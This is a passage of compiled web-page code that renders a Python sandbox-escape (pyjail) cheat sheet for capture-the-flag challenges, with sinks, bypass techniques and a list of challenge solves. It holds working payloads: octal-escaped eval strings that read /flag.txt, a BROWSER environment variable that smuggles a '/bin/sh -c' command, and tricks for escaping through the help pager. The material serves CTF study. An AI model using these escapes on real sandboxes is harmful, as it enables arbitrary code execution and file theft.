class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">~</span>_</code>',Gu,Ia,st,E_,Vu,ja,Je,Ke,h_,$u,Na,$2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[a-m]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,Ju,Pa,Ze,Xe,x_,Ku,Ha,J2=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"op\\145n(*op\\145n('/\\146\\154\\141\\147.txt'))"</span><span class="token punctuation">)</span></code>`,Zu,Ua,nt,C_,Xu,Ma,Qe,sc,L_,Qu,Ba,K2=`<code class="language-py">inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code > "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[n-z]'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>inp<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code>`,sk,Sa,nc,ac,T_,nk,qa,Z2=`<code class="language-py"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"\\157\\160e\\156(*\\157\\160e\\156('/flag.\\164\\170\\164'))"</span><span class="token punctuation">)</span></code>`,ak,za,at,A_,pk,h,pc,U,O_,F_,tc,M,R_,D_,oc,B,I_;return{c(){d=p("blockquote"),w=p("p"),A=r("Notice: This document will be continuously updated."),S=u(),_=p("h2"),m=p("a"),Ya=r("Sinks"),ec=u(),$=p("h3"),Ga=p("a"),rk=r("retrieving builtins"),cc=u(),J=p("pre"),lc=u(),K=p("h3"),Va=p("a"),ik=r("good to know built-in functions and methods"),uc=u(),Z=p("pre"),kc=u(),X=p("h3"),$a=p("a"),_k=r("subclasses"),rc=u(),Q=p("pre"),ic=u(),ss=p("h3"),Ja=p("a"),dk=r("popular modules"),_c=u(),ns=p("pre"),dc=u(),as=p("h2"),Ka=p("a"),fk=r("Bypasses and payloads"),fc=u(),ps=p("h3"),Za=p("a"),mk=r("decorators"),mc=u(),ts=p("pre"),bc=u(),os=p("h3"),Xa=p("a"),bk=r("unicode bypass"),yc=u(),es=p("pre"),gc=u(),cs=p("h3"),Qa=p("a"),yk=r("audithook bypass"),wc=u(),ls=p("pre"),vc=u(),us=p("pre"),Ec=u(),ks=p("h3"),sp=p("a"),gk=r("assigning attributes and variables"),hc=u(),rs=p("pre"),xc=u(),is=p("pre"),Cc=u(),_s=p("h3"),np=p("a"),wk=r("getting attributes"),Lc=u(),ds=p("pre"),Tc=u(),fs=p("pre"),Ac=u(),ms=p("h3"),ap=p("a"),vk=r("running functions and methods without parenthesis"),Oc=u(),bs=p("pre"),Fc=u(),ys=p("pre"),Rc=u(),gs=p("h3"),pp=p("a"),Ek=r("deleting variables"),Dc=u(),ws=p("pre"),Ic=u(),vs=p("h2"),tp=p("a"),hk=r("General stuff"),jc=u(),Es=p("h3"),op=p("a"),xk=r("environment variables"),Nc=u(),O=p("ul"),lt=p("li"),F=p("a"),Ck=r("https://www.elttam.com/blog/env/#python"),Lk=u(),b=p("li"),ut=p("code"),Tk=r("PYTHONINSPECT"),Ak=r(", "),kt=p("code"),Ok=r("PYTHONHOME"),Fk=r(", "),rt=p("code"),Rk=r("PYTHONPATH"),Dk=r(", "),it=p("code"),Ik=r("PYTHONWARNINGS"),jk=r(", "),_t=p("code"),Nk=r("BROWSER"),q=p("ul"),dt=p("li"),ft=p("code"),Pk=r('help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")'),Hk=u(),hs=p("li"),mt=p("code"),Uk=r(`help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))`),Mk=r(" - ref: "),R=p("a"),Bk=r("https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html"),Pc=u(),xs=p("h3"),ep=p("a"),Sk=r("magic methods"),Hc=u(),Cs=p("ul"),bt=p("li"),D=p("a"),qk=r("https://rszalski.github.io/magicmethods/#appendix1"),Uc=u(),Ls=p("h3"),cp=p("a"),zk=r("help"),Mc=u(),g=p("ul"),yt=p("li"),Wk=r("use of pager (ie. less) to escape sandbox"),Yk=u(),lp=p("li"),Gk=r("list modules by entering "),gt=p("code"),Vk=r("modules"),$k=u(),up=p("li"),Jk=r("load modules by entering module names:"),v=p("ul"),kp=p("li"),wt=p("code"),Kk=r("__main__"),Zk=r(" - should already be loaded, help page shown if so"),Xk=u(),rp=p("li"),vt=p("code"),Qk=r("pdb"),sr=r(" - similar to importing pdb"),nr=u(),ip=p("li"),Et=p("code"),ar=r("antigravity"),pr=r(" - similar to importing antigravity"),tr=u(),E=p("li"),ht=p("code"),or=r("PROGRAM_NAME"),er=r(" / "),xt=p("code"),cr=r("jail"),lr=r(" / "),Ct=p("code"),ur=r("app"),kr=r(" - similar to importing and rerunning program if not wrapped in "),Lt=p("code"),rr=r('if __name__ == "__main__":'),ir=u(),_p=p("li"),_r=r("see "),I=p("a"),dr=r("SECCON Beginners CTF 2022: hitchhike4b"),Bc=u(),Ts=p("pre"),Sc=u(),As=p("h3"),dp=p("a"),fr=r("stable payloads"),qc=u(),Os=p("pre"),zc=u(),Fs=p("h3"),fp=p("a"),mr=r("finding sinks from modules"),Wc=u(),j=p("ul"),mp=p("li"),N=p("a"),br=r("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),bp=p("ul"),Tt=p("li"),At=p("code"),yr=r('__import__("ctypes")._aix.environ'),gr=u(),yp=p("li"),P=p("a"),wr=r("https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),gp=p("ul"),Ot=p("li"),Ft=p("code"),vr=r('__import__("_aix_support").sys'),Yc=u(),Rs=p("h3"),wp=p("a"),Er=r("generic classes / bullet points"),Gc=u(),f=p("ul"),H=p("li"),Rt=p("code"),hr=r('f"{65:c}"'),xr=r(" can format an int to char (equivalent to "),Dt=p("code"),Cr=r('"%c" % 65 == chr(65) == "A"'),Lr=r(")"),vp=p("ul"),Ep=p("li"),It=p("code"),Tr=r('"".encode().fromhex("41").decode()'),Ar=r(" parses hex into string"),Or=u(),hp=p("li"),jt=p("code"),Fr=r("type"),z=p("ul"),Nt=p("li"),Pt=p("code"),Rr=r("[].__class__.__class__"),Dr=u(),Ht=p("li"),Ut=p("code"),Ir=r('"".__class__.__class__'),jr=u(),xp=p("li"),Mt=p("code"),Nr=r("object"),C=p("ul"),Bt=p("li"),St=p("code"),Pr=r("[].__class__.__mro__[1]"),Hr=u(),qt=p("li"),zt=p("code"),Ur=r("[].__class__.__bases__[0]"),Mr=u(),Wt=p("li"),Yt=p("code"),Br=r("[].__class__.__base__"),Sr=u(),Cp=p("li"),Gt=p("code"),qr=r("str"),L=p("ul"),Vt=p("li"),$t=p("code"),zr=r('"".__class__'),Wr=u(),Jt=p("li"),Kt=p("code"),Yr=r("[].__doc__.__class__"),Gr=u(),Zt=p("li"),Xt=p("code"),Vr=r("[].__class__.__module__.__class__"),$r=u(),Lp=p("li"),Qt=p("code"),Jr=r("tuple"),Tp=p("ul"),so=p("li"),no=p("code"),Kr=r("[].__class__.__bases__.__class__"),Zr=u(),Ap=p("li"),ao=p("code"),Xr=r("dict"),T=p("ul"),po=p("li"),to=p("code"),Qr=r("{}.__class__"),si=u(),oo=p("li"),eo=p("code"),ni=r("obj.__dict__.__class__"),ai=u(),co=p("li"),lo=p("code"),pi=r('"".__class__.__dict__.copy().__class__'),ti=u(),Ds=p("li"),uo=p("code"),oi=r("class instances"),ei=r(":"),W=p("ul"),Op=p("li"),ko=p("code"),ci=r("class cobj:..."),Fp=p("ul"),ro=p("li"),io=p("code"),li=r("obj = cobj()"),ui=u(),Rp=p("li"),_o=p("code"),ki=r('type("cobj", (object,), {})()'),Dp=p("ul"),fo=p("li"),mo=p("code"),ri=r('[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()'),Vc=u(),Is=p("h2"),Ip=p("a"),ii=r("CTF"),$c=u(),js=p("h3"),jp=p("a"),_i=r("SECCON CTF 13: 1linepyjail"),Jc=u(),Ns=p("ul"),bo=p("li"),yo=p("code"),di=r("jail.py"),Kc=u(),Ps=p("pre"),Zc=u(),Hs=p("ul"),go=p("li"),wo=p("code"),fi=r("solve.py"),Xc=u(),Us=p("pre"),Qc=u(),Ms=p("h3"),Np=p("a"),mi=r("idekCTF 2024: crator"),sl=u(),Bs=p("ul"),vo=p("li"),Eo=p("code"),bi=r("sandbox.py"),nl=u(),Ss=p("pre"),al=u(),qs=p("ul"),ho=p("li"),xo=p("code"),yi=r("chall.py"),pl=u(),zs=p("pre"),tl=u(),Ws=p("ul"),Co=p("li"),Lo=p("code"),gi=r("solve.py"),ol=u(),Ys=p("pre"),el=u(),Gs=p("h3"),Pp=p("a"),wi=r("UIUCTF 2024: ASTea"),cl=u(),Vs=p("ul"),To=p("li"),Ao=p("code"),vi=r("chall.py"),ll=u(),$s=p("pre"),ul=u(),Js=p("ul"),Oo=p("li"),Fo=p("code"),Ei=r("solve.py"),kl=u(),Ks=p("pre"),rl=u(),Zs=p("h3"),Hp=p("a"),hi=r("vsCTF 2024: llama-jail-revenge"),il=u(),Xs=p("ul"),Ro=p("li"),Do=p("code"),xi=r("chall.py"),_l=u(),Qs=p("pre"),dl=u(),sn=p("ul"),Io=p("li"),jo=p("code"),Ci=r("exec_utils.py"),fl=u(),nn=p("pre"),ml=u(),an=p("ul"),No=p("li"),Po=p("code"),Li=r("solve.py"),bl=u(),pn=p("pre"),yl=u(),tn=p("h3"),Up=p("a"),Ti=r("UofTCTF 2024: Zero"),gl=u(),on=p("ul"),Ho=p("li"),Uo=p("code"),Ai=r("chal.py"),wl=u(),en=p("pre"),vl=u(),cn=p("ul"),Mo=p("li"),Bo=p("code"),Oi=r("solve.py"),El=u(),ln=p("pre"),hl=u(),un=p("h3"),Mp=p("a"),Fi=r("GlacierCTF 2023: Avatar"),xl=u(),kn=p("ul"),So=p("li"),qo=p("code"),Ri=r("server.py"),Cl=u(),rn=p("pre"),Ll=u(),_n=p("ul"),zo=p("li"),Wo=p("code"),Di=r("solve.py"),Tl=u(),dn=p("pre"),Al=u(),fn=p("h3"),Bp=p("a"),Ii=r("TFC CTF 2023: My Third Calculator"),Ol=u(),mn=p("ul"),Yo=p("li"),Go=p("code"),ji=r("server.py"),Fl=u(),bn=p("pre"),Rl=u(),yn=p("ul"),Vo=p("li"),$o=p("code"),Ni=r("solve.py"),Dl=u(),gn=p("pre"),Il=u(),wn=p("h3"),Sp=p("a"),Pi=r("Equinor CTF 2023: Dis is it!"),jl=u(),vn=p("ul"),Jo=p("li"),Ko=p("code"),Hi=r("main.py"),Nl=u(),En=p("pre"),Pl=u(),hn=p("ul"),Zo=p("li"),Xo=p("code"),Ui=r("solve.py"),Hl=u(),xn=p("pre"),Ul=u(),Cn=p("h3"),qp=p("a"),Mi=r("37C3 Potluck CTF: tacocat"),Ml=u(),Ln=p("ul"),Qo=p("li"),se=p("code"),Bi=r("main.py"),Bl=u(),Tn=p("pre"),Sl=u(),An=p("ul"),ne=p("li"),ae=p("code"),Si=r("solve.py"),ql=u(),On=p("pre"),zl=u(),Fn=p("h3"),zp=p("a"),qi=r("Internet Festival 2023 CTF Finals: prison"),Wl=u(),Rn=p("ul"),pe=p("li"),te=p("code"),zi=r("prison.py"),Yl=u(),Dn=p("pre"),Gl=u(),In=p("ul"),oe=p("li"),ee=p("code"),Wi=r("solve.py"),Vl=u(),jn=p("pre"),$l=u(),Nn=p("h3"),Wp=p("a"),Yi=r("WACON 2023 Prequal: 